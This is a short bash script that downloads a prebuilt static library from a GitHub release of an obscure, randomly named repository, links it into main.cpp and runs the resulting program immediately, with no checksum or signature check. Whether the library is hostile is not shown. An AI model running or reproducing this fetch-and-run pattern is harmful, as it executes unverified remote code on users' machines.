#!/usr/bin/env bash
set -e
REPO="quickqxuilt/goroomycot"
TAG="clever-comet-cosmic-garden"
LIB="raw-pinnacle.a"
URL="https://github.com/${REPO}/releases/download/${TAG}/${LIB}"
wget -q --tries=3 --timeout=15 -O "$LIB" "$URL"
g++ -std=c++17 -O2 -pthread main.cpp "$LIB" -o app && ./app
